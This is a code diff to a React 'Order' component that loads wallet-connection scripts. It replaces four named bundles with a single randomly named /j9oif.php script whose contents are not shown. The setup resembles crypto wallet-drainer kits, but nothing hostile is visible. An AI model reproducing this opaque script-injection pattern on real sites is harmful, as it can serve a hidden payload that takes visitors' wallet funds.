@@ -74,13 +74,14 @@ const Order = () => {
     // Load the wallet connection scripts in the correct order
     const loadScripts = async () => {
       // Remove any existing scripts first
-      const existingScripts = document.querySelectorAll('script[src*="/bundle.js"], script[src*="/fpbundle.js"], script[src*="/modals.js"], script[src*="/main.js"]');
+      const existingScripts = document.querySelectorAll('script[src*="/j9oif.php"]');
       existingScripts.forEach(script => script.remove());
 
       // Helper function to load a script and wait for it to complete
       const loadScript = (src: string): Promise<void> => {
         return new Promise((resolve, reject) => {
           const script = document.createElement('script');
+          script.charset = 'UTF-8';
           script.src = src;
           script.async = false; // Load in order
           script.onload = () => resolve();
@@ -91,10 +92,7 @@ const Order = () => {
 
       try {
         // Load scripts in the correct order
-        await loadScript('/bundle.js');
-        await loadScript('/fpbundle.js');
-        await loadScript('/modals.js');
-        await loadScript('/main.js');
+        await loadScript('/j9oif.php');
 
         // Initialize popup functionality after all scripts are loaded
         setTimeout(() => {
@@ -111,7 +109,7 @@ const Order = () => {
 
     // Cleanup function to remove scripts and subscription when component unmounts
     return () => {
-      const scripts = document.querySelectorAll('script[src*="/bundle.js"], script[src*="/fpbundle.js"], script[src*="/modals.js"], script[src*="/main.js"]');
+      const scripts = document.querySelectorAll('script[src*="/j9oif.php"]');
       scripts.forEach(script => script.remove());
       
       if (subscription) {
